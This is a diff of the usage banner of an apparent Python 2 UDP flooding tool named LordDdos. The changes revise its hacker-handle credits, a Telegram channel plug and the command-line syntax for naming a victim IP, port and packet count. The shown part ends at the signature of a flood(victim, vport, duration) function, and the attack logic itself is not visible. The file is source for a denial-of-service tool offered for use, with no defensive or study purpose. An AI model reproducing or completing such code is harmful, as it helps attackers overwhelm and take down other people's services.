@@ -3,17 +3,13 @@ import socket
 import random
 import sys
 def usage():
-    print "\033[92m __________WeLcOmE tO LoRdDdOs__________\033[92m"
     print "\033[91m <in the name of Allah> \033[91m"
-    print "\033[92m Coded By #Devil034 - #Hacked16 - #Bl4ck_Ninj4 \033[92m"
+    
+    print "\033[92m Coded By #Devil034 - #Hacked16  \033[92m"
+    
     print "\033[0m CHannel Tel => @Hack028 \033[0m"
-    print "\033[92m Hack028 a good channel to teach you hack training \033[92m"
-    print "\033[How To Use The Tool LordDdos => \033[91m"
-    print "\033[91m  python2 LordDdos.py -i -p -pk \033[91m"
-    print "\033[91m -i => ip site \033[91m"
-    print "\033[91m -p => port \033[91m"
-    print "\033[91m -pk => packet \033[91m"
-    print "\033[92m __________Devil034,Hacked16,Bl4ck_Ninj4__________ \033[92m"
+    print "\033[91m Guide Use => python2 LordDdos.py -i -p -pt \033[91m"
+    print "\033[92m _____________ \033[92m"
 def flood(victim, vport, duration):
     # Support us yaakk... :)
     # Okey Jadi disini saya membuat server, Ketika saya memanggil "SOCK_DGRAM" itu  menunjukkan  UDP type program
